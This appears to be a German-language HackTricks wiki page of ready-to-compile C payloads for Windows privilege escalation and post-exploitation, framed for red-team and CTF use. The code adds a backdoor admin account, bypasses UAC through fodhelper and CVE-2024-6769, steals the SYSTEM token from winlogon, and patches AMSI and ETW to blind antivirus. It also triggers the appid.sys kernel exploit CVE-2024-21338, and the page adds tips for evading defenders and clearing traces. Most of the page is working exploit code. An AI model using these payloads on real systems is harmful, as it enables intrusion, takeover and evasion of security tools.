# Windows-C-Payloads

{{#include ../../banners/hacktricks-training.md}}

Diese Seite sammelt **kleine, eigenständige C-Snippets**, die bei Windows Local Privilege Escalation oder während der post-exploitation nützlich sind. Jeder Payload ist für einfaches **Copy-and-paste** konzipiert, benötigt nur die Windows API / C runtime und kann mit `i686-w64-mingw32-gcc` (x86) oder `x86_64-w64-mingw32-gcc` (x64) kompiliert werden.

> ⚠️  Diese Payloads setzen voraus, dass der Prozess bereits über die mindestens erforderlichen Berechtigungen für die Aktion verfügt (z. B. `SeDebugPrivilege`, `SeImpersonatePrivilege` oder einen Medium-Integrity-Kontext für einen UAC bypass). Sie sind für **Red-Team- oder CTF-Szenarien** vorgesehen, in denen die Ausnutzung einer Schwachstelle zur Ausführung beliebigen nativen Codes geführt hat.

---

## Lokalen Administratorbenutzer hinzufügen
```c
// i686-w64-mingw32-gcc -s -O2 -o addadmin.exe addadmin.c
#include <stdlib.h>
int main(void) {
system("net user hacker Hacker123! /add");
system("net localgroup administrators hacker /add");
return 0;
}
```
---

## UAC Bypass – `fodhelper.exe` Registry Hijack (Mittlere → Hohe Integrität)
Wenn die vertrauenswürdige Binärdatei **`fodhelper.exe`** ausgeführt wird, fragt sie den unten aufgeführten Registry-Pfad ab, ohne das Verb **`DelegateExecute`** zu filtern. Indem ein Angreifer seinen Befehl unter diesem Schlüssel platziert, kann er UAC *ohne das Ablegen einer Datei auf der Festplatte* umgehen.<sup>[[1]](#references)</sup>

*Vom **`fodhelper.exe`** abgefragter Registry-Pfad*
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
Ein minimales PoC, das eine `cmd.exe` mit erhöhten Rechten öffnet:
```c
// x86_64-w64-mingw32-gcc -municode -s -O2 -o uac_fodhelper.exe uac_fodhelper.c
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main(void) {
HKEY hKey;
const char *payload = "C:\\Windows\\System32\\cmd.exe"; // change to arbitrary command

// 1. Create the vulnerable registry key
if (RegCreateKeyExA(HKEY_CURRENT_USER,
"Software\\Classes\\ms-settings\\Shell\\Open\\command", 0, NULL, 0,
KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {

// 2. Set default value => our payload
RegSetValueExA(hKey, NULL, 0, REG_SZ,
(const BYTE*)payload, (DWORD)strlen(payload) + 1);

// 3. Empty "DelegateExecute" value = trigger (")
RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ,
(const BYTE*)"", 1);

RegCloseKey(hKey);

// 4. Launch auto-elevated binary
system("fodhelper.exe");
}
return 0;
}
```
*Getestet unter Windows 10 22H2 und Windows 11 23H2 (Patches vom Juli 2025). Der Bypass funktioniert weiterhin, da Microsoft die fehlende Integritätsprüfung im `DelegateExecute`-Pfad noch nicht behoben hat.*

---

## UAC Bypass – Activation Context Cache Poisoning (`ctfmon.exe`, CVE-2024-6769)
Drive remapping + activation context cache poisoning funktioniert weiterhin gegen gepatchte Windows-10/11-Builds, da `ctfmon.exe` als vertrauenswürdiger UI-Prozess mit hoher Integrität ausgeführt wird, der problemlos aus dem impersonierten `C:`-Laufwerk des Aufrufers lädt und alle von `CSRSS` zwischengespeicherten DLL-Umleitungen wiederverwendet. Der Angriff läuft wie folgt ab: `C:` auf einen vom Angreifer kontrollierten Speicherort umleiten, eine trojanisierte `msctf.dll` ablegen, `ctfmon.exe` starten, um hohe Integrität zu erlangen, und anschließend `CSRSS` anweisen, ein Manifest zwischenzuspeichern, das eine von einer automatisch erhöhten Binary (z. B. `fodhelper.exe`) verwendete DLL umleitet, sodass der nächste Start ohne UAC-Eingabeaufforderung dein Payload übernimmt.<sup>[[5]](#references)</sup>

Praktischer Ablauf:
1. Einen gefälschten `%SystemRoot%\System32`-Baum vorbereiten und die legitime Binary kopieren, die du hijacken möchtest (häufig `ctfmon.exe`).
2. `DefineDosDevice(DDD_RAW_TARGET_PATH)` verwenden, um `C:` innerhalb deines Prozesses umzuleiten, und dabei `DDD_NO_BROADCAST_SYSTEM` beibehalten, damit die Änderung lokal bleibt.
3. Deine DLL und dein Manifest im gefälschten Baum ablegen, `CreateActCtx/ActivateActCtx` aufrufen, um das Manifest in den Activation-Context-Cache zu übertragen, und anschließend die automatisch erhöhte Binary starten, damit sie die umgeleitete DLL direkt in deinen Shellcode auflöst.
4. Den Cache-Eintrag löschen (`sxstrace ClearCache`) oder nach Abschluss einen Neustart durchführen, um Spuren des Angreifers zu beseitigen.

<details>
<summary>C - Fake drive + manifest poison helper (CVE-2024-6769)</summary>
```c
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <shlwapi.h>
#pragma comment(lib, "shlwapi.lib")

BOOL WriteWideFile(const wchar_t *path, const wchar_t *data) {
HANDLE h = CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if (h == INVALID_HANDLE_VALUE) return FALSE;
DWORD bytes = (DWORD)(wcslen(data) * sizeof(wchar_t));
BOOL ok = WriteFile(h, data, bytes, &bytes, NULL);
CloseHandle(h);
return ok;
}

int wmain(void) {
const wchar_t *stage = L"C:\\Users\\Public\\fakeC\\Windows\\System32";
SHCreateDirectoryExW(NULL, stage, NULL);
CopyFileW(L"C:\\Windows\\System32\\ctfmon.exe", L"C:\\Users\\Public\\fakeC\\Windows\\System32\\ctfmon.exe", FALSE);
CopyFileW(L".\\msctf.dll", L"C:\\Users\\Public\\fakeC\\Windows\\System32\\msctf.dll", FALSE);

DefineDosDeviceW(DDD_RAW_TARGET_PATH | DDD_NO_BROADCAST_SYSTEM,
L"C:", L"\\??\\C:\\Users\\Public\\fakeC");

const wchar_t manifest[] =
L"<?xml version='1.0' encoding='UTF-8' standalone='yes'?>"
L"<assembly xmlns='urn:schemas-microsoft-com:asm.v1' manifestVersion='1.0'>"
L" <dependency><dependentAssembly>"
L"  <assemblyIdentity name='Microsoft.Windows.Common-Controls' version='6.0.0.0'"
L"   processorArchitecture='amd64' publicKeyToken='6595b64144ccf1df' language='*' />"
L"  <file name='advapi32.dll' loadFrom='C:\\Users\\Public\\fakeC\\Windows\\System32\\msctf.dll' />"
L" </dependentAssembly></dependency></assembly>";
WriteWideFile(L"C:\\Users\\Public\\fakeC\\payload.manifest", manifest);

ACTCTXW act = { sizeof(act) };
act.lpSource = L"C:\\Users\\Public\\fakeC\\payload.manifest";
ULONG_PTR cookie = 0;
HANDLE ctx = CreateActCtxW(&act);
ActivateActCtx(ctx, &cookie);

STARTUPINFOW si = { sizeof(si) };
PROCESS_INFORMATION pi = { 0 };
CreateProcessW(L"C:\\Windows\\System32\\ctfmon.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

WaitForSingleObject(pi.hProcess, 2000);
DefineDosDeviceW(DDD_REMOVE_DEFINITION, L"C:", L"\\??\\C:\\Users\\Public\\fakeC");
return 0;
}
```
</details>

Tipp zur Bereinigung: Rufe nach dem Erlangen von SYSTEM beim Testen `sxstrace Trace -logfile %TEMP%\sxstrace.etl` und anschließend `sxstrace Parse` auf – wenn dein Manifestname im Log auftaucht, können ihn auch die Defender sehen; rotiere daher bei jedem Durchlauf die Pfade.

---

## SYSTEM shell via token duplication (`SeDebugPrivilege` + `SeImpersonatePrivilege`)
Wenn der aktuelle Prozess **sowohl** über die Privilegien `SeDebug` als auch `SeImpersonate` verfügt (typisch für viele Dienstkonten), kannst du das Token von `winlogon.exe` stehlen, duplizieren und einen Prozess mit erhöhten Rechten starten:
```c
// x86_64-w64-mingw32-gcc -O2 -o system_shell.exe system_shell.c -ladvapi32 -luser32
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

DWORD FindPid(const wchar_t *name) {
PROCESSENTRY32W pe = { .dwSize = sizeof(pe) };
HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
if (snap == INVALID_HANDLE_VALUE) return 0;
if (!Process32FirstW(snap, &pe)) return 0;
do {
if (!_wcsicmp(pe.szExeFile, name)) {
DWORD pid = pe.th32ProcessID;
CloseHandle(snap);
return pid;
}
} while (Process32NextW(snap, &pe));
CloseHandle(snap);
return 0;
}

int wmain(void) {
DWORD pid = FindPid(L"winlogon.exe");
if (!pid) return 1;

HANDLE hProc   = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
HANDLE hToken  = NULL, dupToken = NULL;

if (OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken) &&
DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupToken)) {

STARTUPINFOW si = { .cb = sizeof(si) };
PROCESS_INFORMATION pi = { 0 };
if (CreateProcessWithTokenW(dupToken, LOGON_WITH_PROFILE,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL, CREATE_NEW_CONSOLE,
NULL, NULL, &si, &pi)) {
CloseHandle(pi.hProcess);
CloseHandle(pi.hThread);
}
}
if (hProc) CloseHandle(hProc);
if (hToken) CloseHandle(hToken);
if (dupToken) CloseHandle(dupToken);
return 0;
}
```
Für eine ausführlichere Erklärung der Funktionsweise siehe:

{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

---

## In-Memory AMSI & ETW Patch (Defence Evasion)
Die meisten modernen AV/EDR-Engines verlassen sich auf **AMSI** und **ETW**, um bösartiges Verhalten zu untersuchen. Das Patchen beider Schnittstellen frühzeitig innerhalb des aktuellen Prozesses verhindert, dass skriptbasierte Payloads (z. B. PowerShell, JScript) gescannt werden.<sup>[[2]](#references)</sup>
```c
// gcc -o patch_amsi.exe patch_amsi.c -lntdll
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>

void Patch(BYTE *address) {
DWORD oldProt;
// mov eax, 0x80070057 ; ret  (AMSI_RESULT_E_INVALIDARG)
BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
VirtualProtect(address, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProt);
memcpy(address, patch, sizeof(patch));
VirtualProtect(address, sizeof(patch), oldProt, &oldProt);
}

int main(void) {
HMODULE amsi  = LoadLibraryA("amsi.dll");
HMODULE ntdll = GetModuleHandleA("ntdll.dll");

if (amsi)  Patch((BYTE*)GetProcAddress(amsi,  "AmsiScanBuffer"));
if (ntdll) Patch((BYTE*)GetProcAddress(ntdll, "EtwEventWrite"));

MessageBoxA(NULL, "AMSI & ETW patched!", "OK", MB_OK);
return 0;
}
```
*Der obige Patch gilt nur für den jeweiligen Prozess; das Starten einer neuen PowerShell nach seiner Ausführung erfolgt ohne AMSI-/ETW-Inspektion.*

---

## Create child as Protected Process Light (PPL)
Fordere beim Erstellen mithilfe von `STARTUPINFOEX` + `PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL` eine PPL-Schutzstufe für einen Child-Prozess an. Dies ist eine dokumentierte API und funktioniert nur, wenn das Ziel-Image für die angeforderte Signer-Klasse signiert ist (Windows/WindowsLight/Antimalware/LSA/WinTcb).<sup>[[3]](#references)[[4]](#references)</sup>
```c
// x86_64-w64-mingw32-gcc -O2 -o spawn_ppl.exe spawn_ppl.c
#include <windows.h>

int wmain(void) {
STARTUPINFOEXW si = {0};
PROCESS_INFORMATION pi = {0};
si.StartupInfo.cb = sizeof(si);

SIZE_T attrSize = 0;
InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
si.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrSize);
InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attrSize);

DWORD lvl = PROTECTION_LEVEL_ANTIMALWARE_LIGHT; // choose the desired level
UpdateProcThreadAttribute(si.lpAttributeList, 0,
PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL,
&lvl, sizeof(lvl), NULL, NULL);

if (!CreateProcessW(L"C\\\Windows\\\System32\\\notepad.exe", NULL, NULL, NULL, FALSE,
EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi)) {
// likely ERROR_INVALID_IMAGE_HASH (577) if the image is not properly signed for that level
return 1;
}
DeleteProcThreadAttributeList(si.lpAttributeList);
HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
CloseHandle(pi.hThread);
CloseHandle(pi.hProcess);
return 0;
}
```
Am häufigsten verwendete Levels:
- `PROTECTION_LEVEL_WINDOWS_LIGHT` (2)
- `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` (3)
- `PROTECTION_LEVEL_LSA_LIGHT` (4)

Validiere das Ergebnis mit Process Explorer/Process Hacker, indem du die Protection-Spalte überprüfst.

---

## Local Service -> Kernel über `appid.sys` Smart-Hash (`IOCTL 0x22A018`, CVE-2024-21338)
`appid.sys` stellt ein Geräteobjekt (`\\.\\AppID`) bereit, dessen Smart-Hash-Wartungs-IOCTL benutzerdefinierte Funktionszeiger akzeptiert, wenn der Caller als `LOCAL SERVICE` ausgeführt wird; Lazarus missbraucht dies, um PPL zu deaktivieren und beliebige Treiber zu laden. Daher sollten Red Teams einen fertigen Trigger für den Einsatz in Laborumgebungen bereithalten.<sup>[[6]](#references)</sup>

Operational notes:
- Du benötigst weiterhin ein `LOCAL SERVICE`-Token. Stehle es mit `SeImpersonatePrivilege` aus `Schedule` oder `WdiServiceHost` und führe anschließend eine Impersonation durch, bevor du auf das Gerät zugreifst, damit die ACL-Prüfungen erfolgreich sind.
- IOCTL `0x22A018` erwartet eine Struktur mit zwei Callback-Zeigern (Abfragelänge + Lesefunktion). Zeige beide auf User-Mode-Stubs, die einen Token-Overwrite erstellen oder Ring-0-Primitives mappen. Halte die Buffer jedoch RWX, damit KernelPatchGuard die Chain nicht mittendrin zum Absturz bringt.
- Beende nach dem Erfolg die Impersonation und gib das Geräte-Handle zurück. Defender suchen inzwischen nach unerwarteten `Device\\AppID`-Handles; schließe es daher sofort, sobald die Privilegien erlangt wurden.

<details>
<summary>C - Skeleton-Trigger für den Smart-Hash-Missbrauch von `appid.sys`</summary>
```c
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>

typedef struct _APPID_SMART_HASH {
ULONGLONG UnknownCtx[4];
PVOID QuerySize;   // called first
PVOID ReadBuffer;  // called with size returned above
BYTE  Reserved[0x40];
} APPID_SMART_HASH;

DWORD WINAPI KernelThunk(PVOID ctx) {
// map SYSTEM shellcode, steal token, etc.
return 0;
}

int wmain(void) {
HANDLE hDev = CreateFileW(L"\\\\.\\AppID", GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
if (hDev == INVALID_HANDLE_VALUE) {
printf("[-] CreateFileW failed: %lu\n", GetLastError());
return 1;
}

APPID_SMART_HASH in = {0};
in.QuerySize = KernelThunk;
in.ReadBuffer = KernelThunk;

DWORD bytes = 0;
if (!DeviceIoControl(hDev, 0x22A018, &in, sizeof(in), NULL, 0, &bytes, NULL)) {
printf("[-] DeviceIoControl failed: %lu\n", GetLastError());
}
CloseHandle(hDev);
return 0;
}
```
</details>

Minimales Fix-up für einen weaponized Build: Mappe eine RWX-Sektion mit `VirtualAlloc`, kopiere deinen Token-Duplication-Stub dorthin, setze `KernelThunk = section`, und sobald `DeviceIoControl` zurückkehrt, solltest du selbst unter PPL SYSTEM sein.

---

## Referenzen

- [1] [Erster Eintrag: Willkommen und fileless UAC bypass (fodhelper.exe / ms-settings DelegateExecute)](https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/)
- [2] [AMSI Bypass durch Memory Patching](https://rastamouse.me/memory-patching-amsi-bypass/)
- [3] [CreateProcessAsPPL – minimaler PPL process launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [4] [UpdateProcThreadAttribute function (Win32 apps) - Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-updateprocthreadattribute)
- [5] [Neue Exploit Chain ermöglicht Windows UAC bypass](https://www.darkreading.com/vulnerabilities-threats/exploit-chain-windows-uac-bypass)
- [6] [Lazarus und das FudModule Rootkit: Über BYOVD hinaus mit einem Admin-to-Kernel Zero-Day](https://www.gendigital.com/blog/insights/research/lazarus-and-the-fudmodule-rootkit-beyond-byovd-with-an-admin-to-kernel-zero-day)

{{#include ../../banners/hacktricks-training.md}}
